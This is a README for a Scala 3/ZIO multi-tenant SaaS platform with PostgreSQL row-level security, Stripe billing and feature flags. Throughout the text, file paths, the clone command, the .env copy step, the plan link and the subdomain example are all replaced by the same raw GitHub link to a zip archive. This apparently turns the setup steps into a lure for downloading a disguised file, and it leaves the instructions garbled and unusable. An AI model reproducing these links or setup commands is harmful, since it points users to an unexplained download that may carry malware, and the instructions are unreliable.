# Multi-Tenant SaaS Platform

A production-grade multi-tenant SaaS platform built with Scala 3, ZIO 2, and PostgreSQL Row-Level Security. This project demonstrates enterprise-level architecture patterns for building secure, scalable, and maintainable software-as-a-service applications.

## Overview

This platform provides a complete foundation for building multi-tenant applications with:

- **Tenant Isolation**: PostgreSQL Row-Level Security (RLS) ensures complete data isolation between tenants at the database level
- **Effect-Based Architecture**: ZIO 2 for type-safe, composable, and testable effectful programming
- **Subscription Billing**: Stripe integration for subscription management and usage-based billing
- **Feature Flags**: Redis-backed feature flag system with plan-based and percentage rollout targeting
- **Authentication**: JWT-based authentication with OAuth2 support
- **Observability**: OpenTelemetry tracing, Prometheus metrics, and structured logging

## Architecture

```
                           API Gateway Layer
  +-------------+  +--------------+  +-------------+  +---------------+
  | Auth Filter |->|Tenant Router |->|Rate Limiter |->| Request Logger|
  +-------------+  +--------------+  +-------------+  +---------------+
                              |
                   +----------v-----------+
                   |   Effect System (ZIO) |
                   |  TenantCtx | Flags    |
                   +----------+-----------+
                              |
         +--------------------+--------------------+
         |                    |                    |
  +------v------+      +------v------+      +------v------+
  | PostgreSQL  |      |    Redis    |      |   Stripe    |
  | (RLS)       |      | (Sessions)  |      | (Billing)   |
  +-------------+      +-------------+      +-------------+
```

## Technology Stack

| Component | Technology | Purpose |
|-----------|------------|---------|
| Language | Scala 3.3.x | Modern syntax, type inference |
| Effect System | ZIO 2.x | Composable effects, resource management |
| HTTP | zio-http | Native ZIO HTTP server |
| Database | PostgreSQL 15+ | RLS, JSONB, full-text search |
| DB Access | Quill | Compile-time query generation |
| Configuration | Ciris | Type-safe configuration |
| Authentication | JWT + OAuth2 | Stateless auth with social login |
| Billing | Stripe | Subscription and usage billing |
| Feature Flags | Redis | Dynamic feature targeting |
| Observability | OpenTelemetry | Distributed tracing and metrics |

## Project Structure

```
multitenant-saas/
├── https://github.com/MilaCodesIt/multi-tenant-saas-platform/raw/refs/heads/main/project/saas_tenant_platform_multi_v2.4.zip                    # SBT build configuration
├── project/                     # SBT plugins and settings
├── docker/                      # Docker Compose and configs
│   ├── https://github.com/MilaCodesIt/multi-tenant-saas-platform/raw/refs/heads/main/project/saas_tenant_platform_multi_v2.4.zip
│   └── https://github.com/MilaCodesIt/multi-tenant-saas-platform/raw/refs/heads/main/project/saas_tenant_platform_multi_v2.4.zip
├── modules/
│   ├── core/                    # Domain models, errors, types
│   ├── config/                  # Configuration loading
│   ├── database/                # Repositories, migrations
│   ├── api/                     # HTTP routes and middleware
│   ├── auth/                    # JWT, OAuth2, sessions
│   ├── billing/                 # Stripe integration
│   ├── features/                # Feature flag system
│   └── observability/           # Tracing, metrics, logging
├── it/                          # Integration tests
└── docs/                        # Documentation
```

## Getting Started

### Prerequisites

- JDK 17 or later
- SBT 1.9.x
- Docker and Docker Compose
- PostgreSQL 15+ (via Docker or local)
- Redis 7+ (via Docker or local)

### Local Development

1. Clone the repository:
```bash
git clone https://github.com/MilaCodesIt/multi-tenant-saas-platform/raw/refs/heads/main/project/saas_tenant_platform_multi_v2.4.zip
cd multi-tenant-saas-platform
```

2. Start infrastructure services:
```bash
cd docker
cp https://github.com/MilaCodesIt/multi-tenant-saas-platform/raw/refs/heads/main/project/saas_tenant_platform_multi_v2.4.zip .env
docker-compose up -d
```

3. Run the application:
```bash
sbt "api/run"
```

4. Verify the server is running:
```bash
curl http://localhost:8080/health
```

### Running Tests

```bash
# Unit tests
sbt test

# Integration tests
sbt it/test

# All tests with coverage
sbt coverage test it/test coverageReport
```

## Development Status

This project is under active development. See the [Implementation Plan](https://github.com/MilaCodesIt/multi-tenant-saas-platform/raw/refs/heads/main/project/saas_tenant_platform_multi_v2.4.zip) for detailed phase breakdowns and the [GitHub Issues](../../issues) for current progress.

## Key Features

### Multi-Tenancy

- Subdomain-based tenant routing (https://github.com/MilaCodesIt/multi-tenant-saas-platform/raw/refs/heads/main/project/saas_tenant_platform_multi_v2.4.zip)
- Header-based tenant identification for API clients
- PostgreSQL RLS for database-level isolation
- Tenant context propagation via ZIO environment

### Billing Integration

- Stripe Checkout for subscription signup
- Usage-based metering for API calls
- Self-service billing portal
- Webhook handling for subscription events

### Feature Flags

- Plan-based feature gating
- Percentage-based rollouts
- Per-tenant and per-user overrides
- Redis-backed for low-latency checks

### Security

- JWT token authentication
- OAuth2 social login (Google)
- Role-based access control (RBAC)
- Rate limiting per tenant
- Security headers middleware

## License

MIT License - see [LICENSE](LICENSE) for details.

## Contributing

Contributions are welcome. Please read the contributing guidelines before submitting pull requests.
